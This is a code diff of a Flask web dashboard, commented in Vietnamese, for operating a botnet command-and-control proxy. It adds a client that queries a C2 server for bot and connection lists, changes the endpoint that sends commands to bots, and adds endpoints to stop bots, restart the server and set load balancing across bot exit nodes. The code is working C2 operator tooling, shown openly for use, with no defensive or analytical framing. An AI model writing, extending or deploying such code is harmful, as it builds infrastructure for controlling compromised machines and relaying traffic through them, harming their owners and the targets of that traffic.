@@ -13,6 +13,7 @@ from datetime import datetime, timedelta
 from flask import Flask, render_template, jsonify, request, redirect, url_for, session
 from flask_socketio import SocketIO, emit
 import psutil
+from typing import Dict, List, Optional
 
 # Add current directory to path for imports
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
@@ -20,6 +21,8 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 try:
     from c2_proxy_server import C2ProxyServer
     from proxy_load_balancer import ProxyLoadBalancer, BotHealthMonitor
+    import socket
+    import json
 except ImportError:
     print("❌ Import error: Make sure c2_proxy_server.py and proxy_load_balancer.py are in the same directory")
     sys.exit(1)
@@ -32,6 +35,7 @@ socketio = SocketIO(app, cors_allowed_origins="*")
 proxy_server = None
 load_balancer = None
 health_monitor = None
+c2_client = None
 dashboard_stats = {
     'start_time': datetime.now(),
     'total_requests': 0,
@@ -39,6 +43,90 @@ dashboard_stats = {
     'active_connections': 0,
     'bot_count': 0
 }
+
+class C2Client:
+    def __init__(self, c2_host="localhost", c2_port=3334):
+        self.c2_host = c2_host
+        self.c2_port = c2_port
+        self.socket = None
+        self.connected = False
+        
+    def connect(self):
+        """Kết nối với C2 server"""
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.settimeout(5)
+            self.socket.connect((self.c2_host, self.c2_port))
+            self.socket.settimeout(None)
+            self.connected = True
+            print(f"✅ Connected to C2 server at {self.c2_host}:{self.c2_port}")
+            return True
+        except Exception as e:
+            print(f"❌ Failed to connect to C2 server: {e}")
+            return False
+            
+    def disconnect(self):
+        """Ngắt kết nối với C2 server"""
+        if self.socket:
+            self.socket.close()
+            self.connected = False
+            
+    def send_command(self, command: str) -> str:
+        """Gửi lệnh đến C2 server"""
+        if not self.connected:
+            return None
+            
+        try:
+            self.socket.send(f"{command}\n".encode())
+            response = self.socket.recv(4096).decode().strip()
+            return response
+        except Exception as e:
+            print(f"❌ Error sending command: {e}")
+            return None
+            
+    def get_status(self) -> Dict:
+        """Lấy trạng thái server"""
+        if not self.connected:
+            return {"error": "Not connected to C2 server"}
+            
+        try:
+            response = self.send_command("GET_STATUS")
+            if response:
+                return json.loads(response)
+            else:
+                return {"error": "No response from server"}
+        except Exception as e:
+            return {"error": str(e)}
+            
+    def get_bots(self) -> List[Dict]:
+        """Lấy danh sách bots"""
+        if not self.connected:
+            return []
+            
+        try:
+            response = self.send_command("GET_BOTS")
+            if response:
+                return json.loads(response)
+            else:
+                return []
+        except Exception as e:
+            print(f"❌ Error getting bots: {e}")
+            return []
+            
+    def get_connections(self) -> List[Dict]:
+        """Lấy danh sách kết nối"""
+        if not self.connected:
+            return []
+            
+        try:
+            response = self.send_command("GET_CONNECTIONS")
+            if response:
+                return json.loads(response)
+            else:
+                return []
+        except Exception as e:
+            print(f"❌ Error getting connections: {e}")
+            return []
 
 @app.route('/')
 def index():
@@ -48,13 +136,35 @@ def index():
 @app.route('/api/status')
 def api_status():
     """API lấy trạng thái server"""
-    if not proxy_server:
-        return jsonify({'error': 'Proxy server not running'}), 500
-        
+    global c2_client
+    
     try:
-        status = proxy_server.get_status()
-        lb_stats = load_balancer.get_load_balancing_stats() if load_balancer else {}
-        health_status = health_monitor.get_health_status(proxy_server.bot_exit_nodes) if health_monitor else {}
+        # Kết nối với C2 server nếu chưa kết nối
+        if not c2_client or not c2_client.connected:
+            c2_client = C2Client("localhost", 3334)
+            if not c2_client.connect():
+                return jsonify({'error': 'Cannot connect to C2 server'}), 500
+        
+        # Lấy thông tin từ C2 server
+        status = c2_client.get_status()
+        bots = c2_client.get_bots()
+        connections = c2_client.get_connections()
+        
+        # Tạo load balancer stats từ thông tin bots
+        lb_stats = {
+            'total_bots': len(bots),
+            'active_bots': len([b for b in bots if b.get('status') == 'online']),
+            'bot_stats': {bot['bot_id']: bot.get('exit_node_info', {}) for bot in bots},
+            'total_requests': sum(bot.get('requests_handled', 0) for bot in bots),
+            'total_bytes': sum(bot.get('bytes_transferred', 0) for bot in bots),
+            'total_connections': len(connections)
+        }
+        
+        # Tạo health status
+        health_status = {
+            'status': 'healthy' if len(bots) > 0 else 'no_bots',
+            'message': f'{len(bots)} bots connected' if len(bots) > 0 else 'No bots available'
+        }
         
         return jsonify({
             'server_status': status,
@@ -69,37 +179,17 @@ def api_status():
 @app.route('/api/bots')
 def api_bots():
     """API lấy danh sách bot"""
-    if not proxy_server:
-        return jsonify({'error': 'Proxy server not running'}), 500
-        
+    global c2_client
+    
     try:
-        bots = []
-        for bot_id, bot_info in proxy_server.connected_bots.items():
-            exit_node_info = proxy_server.bot_exit_nodes.get(bot_id, {})
-            
-            bot_data = {
-                'bot_id': bot_id,
-                'hostname': bot_info.get('hostname', 'Unknown'),
-                'address': bot_info.get('address', ('Unknown', 0)),
-                'status': bot_info.get('status', 'unknown'),
-                'connected_at': bot_info.get('connected_at', datetime.now()).isoformat(),
-                'last_seen': bot_info.get('last_seen', datetime.now()).isoformat(),
-                'proxy_mode': bot_info.get('proxy_mode', False),
-                'requests_handled': bot_info.get('requests_handled', 0),
-                'bytes_transferred': bot_info.get('bytes_transferred', 0),
-                'exit_node_info': {
-                    'status': exit_node_info.get('status', 'inactive'),
-                    'connections': exit_node_info.get('connections', 0),
-                    'max_connections': exit_node_info.get('max_connections', 0),
-                    'health_score': exit_node_info.get('health_score', 0),
-                    'total_requests': exit_node_info.get('total_requests', 0),
-                    'successful_requests': exit_node_info.get('successful_requests', 0),
-                    'failed_requests': exit_node_info.get('failed_requests', 0),
-                    'circuit_breaker_state': exit_node_info.get('circuit_breaker_state', 'closed')
-                }
-            }
-            bots.append(bot_data)
-            
+        # Kết nối với C2 server nếu chưa kết nối
+        if not c2_client or not c2_client.connected:
+            c2_client = C2Client("localhost", 3334)
+            if not c2_client.connect():
+                return jsonify({'error': 'Cannot connect to C2 server'}), 500
+        
+        # Lấy danh sách bots từ C2 server
+        bots = c2_client.get_bots()
         return jsonify({'bots': bots})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -107,24 +197,17 @@ def api_bots():
 @app.route('/api/connections')
 def api_connections():
     """API lấy danh sách kết nối proxy"""
-    if not proxy_server:
-        return jsonify({'error': 'Proxy server not running'}), 500
-        
+    global c2_client
+    
     try:
-        connections = []
-        for conn_id, conn_info in proxy_server.active_proxy_connections.items():
-            connection_data = {
-                'connection_id': conn_id,
-                'client_addr': conn_info.get('client_addr', ('Unknown', 0)),
-                'bot_id': conn_info.get('bot_id', 'Unknown'),
-                'target_host': conn_info.get('target_host', 'Unknown'),
-                'target_port': conn_info.get('target_port', 0),
-                'is_https': conn_info.get('is_https', False),
-                'start_time': conn_info.get('start_time', datetime.now()).isoformat(),
-                'bytes_transferred': conn_info.get('bytes_transferred', 0)
-            }
-            connections.append(connection_data)
-            
+        # Kết nối với C2 server nếu chưa kết nối
+        if not c2_client or not c2_client.connected:
+            c2_client = C2Client("localhost", 3334)
+            if not c2_client.connect():
+                return jsonify({'error': 'Cannot connect to C2 server'}), 500
+        
+        # Lấy danh sách connections từ C2 server
+        connections = c2_client.get_connections()
         return jsonify({'connections': connections})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -218,9 +301,8 @@ def api_bot_command():
             
         bot_info = proxy_server.connected_bots[bot_id]
         bot_socket = bot_info['socket']
-        
-        # Send command to bot
-        bot_socket.send(command.encode())
+        # Gửi lệnh kèm newline để phù hợp giao thức line-based
+        bot_socket.send((command.strip() + "\n").encode())
         
         return jsonify({'message': f'Command sent to bot {bot_id}'})
         
@@ -240,12 +322,49 @@ def api_load_balancer_strategy():
         if not strategy:
             return jsonify({'error': 'Missing strategy'}), 400
             
-        if strategy not in load_balancer.load_balancing_strategies:
+        # Cho phép các strategy lõi: round_robin, least_connections, health_based, random
+        allowed = {"round_robin", "least_connections", "health_based", "random"}
+        if strategy not in allowed:
             return jsonify({'error': 'Invalid strategy'}), 400
-            
-        # Update strategy (this would need to be implemented in the load balancer)
-        return jsonify({'message': f'Load balancing strategy changed to {strategy}'})
         
+        if not proxy_server:
+            return jsonify({'error': 'Proxy server not running'}), 400
+        
+        ok = proxy_server.set_load_balancing_strategy(strategy)
+        if not ok:
+            return jsonify({'error': 'Failed to set strategy'}), 500
+        return jsonify({'message': f'Load balancing strategy changed to {strategy}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/stop_bot', methods=['POST'])
+def api_stop_bot():
+    """API ngắt kết nối một bot"""
+    if not proxy_server:
+        return jsonify({'error': 'Proxy server not running'}), 500
+    try:
+        data = request.get_json()
+        bot_id = data.get('bot_id')
+        if not bot_id:
+            return jsonify({'error': 'Missing bot_id'}), 400
+        ok = proxy_server.stop_bot(bot_id)
+        if not ok:
+            return jsonify({'error': 'Bot not found or cannot stop'}), 404
+        return jsonify({'message': f'Stopped bot {bot_id}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/restart_server', methods=['POST'])
+def api_restart_server():
+    """API khởi động lại server"""
+    global proxy_server
+    if not proxy_server:
+        return jsonify({'error': 'Proxy server not running'}), 500
+    try:
+        ok = proxy_server.restart()
+        if not ok:
+            return jsonify({'error': 'Failed to restart'}), 500
+        return jsonify({'message': 'Server restarted'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
